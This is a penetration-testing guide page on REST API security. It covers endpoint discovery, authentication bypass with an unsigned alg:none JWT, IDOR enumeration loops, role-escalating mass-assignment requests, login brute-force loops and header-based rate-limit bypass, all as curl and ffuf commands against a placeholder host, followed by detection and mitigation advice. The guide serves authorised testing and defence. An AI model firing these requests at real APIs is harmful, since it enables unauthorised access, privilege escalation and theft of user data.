% Filename: 04-web-testing/api-testing/rest-api.md
% Display name: REST API Testing
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0009 (Collection)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1213 (Data from Information Repositories)
% Authors: @TristanInSec

# REST API Testing

## Overview

REST APIs expose application functionality through HTTP endpoints. They are the backbone of modern web and mobile applications. API security flaws consistently rank among the most critical vulnerabilities — OWASP maintains a dedicated API Security Top 10 separate from the general web Top 10.

Common API security issues include broken object-level authorization (BOLA/IDOR), broken authentication, excessive data exposure, mass assignment, and missing rate limiting. These flaws often exist because APIs trust client-side filtering and assume only the intended front-end will call them.

## ATT&CK Mapping

- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application
- **Tactic:** TA0009 - Collection
- **Technique:** T1213 - Data from Information Repositories

## Prerequisites

- Target application exposes a REST API (JSON/XML over HTTP)
- API endpoint URLs identified (documentation, JavaScript source, traffic interception)
- Authentication tokens or API keys obtained (if required)
- Proxy configured for request interception (Burp Suite, mitmproxy)

## Detection Methodology

### API Endpoint Discovery

**From documentation:**

Many APIs expose documentation endpoints:

```text
/api/docs
/api/swagger
/api/swagger.json
/api/swagger/v1/swagger.json
/swagger-ui.html
/swagger-ui/
/openapi.json
/openapi/v3/api-docs
/api-docs
/v1/api-docs
/v2/api-docs
/.well-known/openapi.json
/graphql (for GraphQL endpoints)
```

**From JavaScript source:**

```bash
# curl
# https://curl.se/
# Download JavaScript bundles and search for API paths
curl -s http://target.com/static/js/app.js | grep -oE '"/api/[^"]*"' | sort -u
curl -s http://target.com/static/js/app.js | grep -oE "'/api/[^']*'" | sort -u
```

**Endpoint fuzzing:**

```bash
# ffuf
# https://github.com/ffuf/ffuf
# Fuzz API endpoints
ffuf -u http://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -mc 200,201,204,301,302,401,403,405

# Fuzz with API-specific wordlist
ffuf -u http://target.com/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405

# Fuzz API version numbers
ffuf -u http://target.com/api/vFUZZ/users -w <(seq 1 10) -mc 200,301,302,401,403
```

**HTTP method testing:**

```bash
# curl
# https://curl.se/
# Test which HTTP methods an endpoint accepts
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method http://target.com/api/v1/users
  echo
done
```

### Authentication Testing

```bash
# curl
# https://curl.se/
# Test unauthenticated access
curl -s http://target.com/api/v1/users

# Test with expired/invalid token
curl -s -H "Authorization: Bearer invalid_token_here" http://target.com/api/v1/users

# Test with empty Authorization header
curl -s -H "Authorization: " http://target.com/api/v1/users
curl -s -H "Authorization: Bearer " http://target.com/api/v1/users

# Test JWT with no signature (alg: none)
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"sub":"admin","iat":1234567890}
# Encode header.payload. (trailing dot, no signature)
curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0." \
  http://target.com/api/v1/admin
```

## Techniques

### Broken Object-Level Authorization (BOLA/IDOR)

BOLA (OWASP API1) occurs when the API does not verify that the authenticated user is authorized to access the requested object. This is the most common API vulnerability.

```bash
# curl
# https://curl.se/
# Access your own resource (authenticated as user 42)
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/v1/users/42

# Access another user's resource (change the ID)
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/v1/users/43
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/v1/users/1

# IDOR in nested resources
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/v1/users/43/orders
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/v1/users/43/profile

# Enumerate IDs with sequential integers
for id in $(seq 1 100); do
  resp=$(curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/v1/users/$id)
  echo "$id: $(echo $resp | head -c 100)"
done
```

Test with different ID formats:

```text
/api/v1/users/43              (sequential integer)
/api/v1/users/user_43         (prefixed integer)
/api/v1/orders/ORD-00043      (formatted string)
/api/v1/docs/a1b2c3d4-e5f6    (UUID — harder to enumerate, but try predictable patterns)
```

### Broken Function-Level Authorization (BFLA)

BFLA (OWASP API5) occurs when a regular user can access admin-only endpoints.

```bash
# curl
# https://curl.se/
# Test admin endpoints with regular user token
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" http://target.com/api/v1/admin/users
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" http://target.com/api/v1/admin/settings
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" -X DELETE http://target.com/api/v1/users/43

# Test by changing HTTP method (GET allowed but DELETE may also work)
curl -s -H "Authorization: Bearer REGULAR_USER_TOKEN" -X PUT http://target.com/api/v1/users/43 \
  -H "Content-Type: application/json" -d '{"role":"admin"}'
```

### Mass Assignment

Mass assignment falls under OWASP API3:2023 (Broken Object Property Level Authorization). It occurs when the API binds request parameters directly to internal object properties without filtering. Attackers can set fields they shouldn't have access to.

```bash
# curl
# https://curl.se/
# Normal profile update
curl -s -X PUT http://target.com/api/v1/users/42 \
  -H "Authorization: Bearer USER42_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"New Name"}'

# Attempt to set privileged fields
curl -s -X PUT http://target.com/api/v1/users/42 \
  -H "Authorization: Bearer USER42_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"New Name","role":"admin"}'

curl -s -X PUT http://target.com/api/v1/users/42 \
  -H "Authorization: Bearer USER42_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"New Name","is_admin":true}'

curl -s -X PUT http://target.com/api/v1/users/42 \
  -H "Authorization: Bearer USER42_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"New Name","credits":99999,"verified":true}'
```

Common mass assignment targets: `role`, `is_admin`, `admin`, `verified`, `active`, `credits`, `balance`, `permissions`, `group`, `org_id`.

### Excessive Data Exposure

APIs often return full objects and rely on the front-end to filter what the user sees. Request the API directly to see all returned fields:

```bash
# curl
# https://curl.se/
# Check if API returns sensitive fields beyond what the UI displays
curl -s -H "Authorization: Bearer USER42_TOKEN" http://target.com/api/v1/users/42 | python3 -m json.tool

# Look for: password hashes, tokens, internal IDs, PII, role fields,
# creation timestamps, last login IPs, email addresses of other users
```

### Rate Limiting Bypass

```bash
# curl
# https://curl.se/
# Test if rate limiting exists
for i in $(seq 1 50); do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://target.com/api/v1/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"attempt'$i'"}')
  echo "Attempt $i: $code"
done

# Bypass techniques — add headers that may reset rate limit tracking
curl -s -H "X-Forwarded-For: 127.0.0.$((RANDOM % 256))" http://target.com/api/v1/login \
  -H "Content-Type: application/json" -d '{"username":"admin","password":"test"}'

curl -s -H "X-Original-URL: /api/v1/login" http://target.com/api/v1/login \
  -H "Content-Type: application/json" -d '{"username":"admin","password":"test"}'
```

Common headers that may affect rate limiting:

```text
X-Forwarded-For: <varying IP>
X-Real-IP: <varying IP>
X-Originating-IP: <varying IP>
X-Client-IP: <varying IP>
```

### Verbose Error Exploitation

API error messages often leak implementation details:

```bash
# curl
# https://curl.se/
# Send malformed JSON
curl -s -X POST http://target.com/api/v1/users \
  -H "Content-Type: application/json" -d '{invalid json}'

# Send wrong data types
curl -s -X POST http://target.com/api/v1/users \
  -H "Content-Type: application/json" -d '{"id":"not_a_number"}'

# Send empty body to POST endpoint
curl -s -X POST http://target.com/api/v1/users -H "Content-Type: application/json"

# Request non-existent endpoint (may reveal framework)
curl -s http://target.com/api/v1/nonexistent
```

Error responses may reveal: framework version, database type, stack traces, internal file paths, SQL query fragments, and field names.

### API Versioning Attacks

Older API versions may lack security fixes present in the current version:

```bash
# curl
# https://curl.se/
# If current API is v3, test older versions
curl -s http://target.com/api/v1/users
curl -s http://target.com/api/v2/users

# Old version may lack authorization checks, rate limiting, or input validation
# that were added in newer versions
```

## Detection Methods

### Network-Based Detection

- Unusual volume of API requests from a single source (endpoint enumeration)
- Sequential ID enumeration patterns in request URLs
- Requests to admin API endpoints from non-admin user sessions
- HTTP method probing (OPTIONS, PUT, DELETE) against multiple endpoints
- Requests with manipulated authorization headers (empty tokens, `alg:none` JWTs)

### Host-Based Detection

- Authorization failures logged for resources belonging to other users
- Mass assignment attempts — PUT/PATCH requests containing privileged field names (`role`, `admin`, `permissions`)
- API responses returning 200 with sensitive data for unauthorized users
- Rate limit bypass attempts (rapid requests with varying `X-Forwarded-For` headers)

## Mitigation Strategies

- **Object-level authorization** — verify that the authenticated user is authorized to access the specific requested object on every request. Do not rely on client-supplied IDs alone — check ownership server-side
- **Function-level authorization** — enforce role-based access control on every endpoint. Admin routes must verify admin role, not just authentication
- **Input filtering** — explicitly whitelist which fields can be set by API consumers. Never bind request bodies directly to internal models (prevents mass assignment)
- **Response filtering** — return only the fields the client needs. Do not expose internal fields (`password_hash`, `internal_id`, `role`) in API responses
- **Rate limiting** — implement rate limiting per user/session (not per IP). Use progressive backoff for authentication endpoints
- **Disable verbose errors in production** — return generic error messages. Log detailed errors server-side only

## References

### Pentest Guides & Research

- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
- [PortSwigger Web Security Academy - API Testing](https://portswigger.net/web-security/api-testing)

### MITRE ATT&CK

- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1213 - Data from Information Repositories](https://attack.mitre.org/techniques/T1213/)
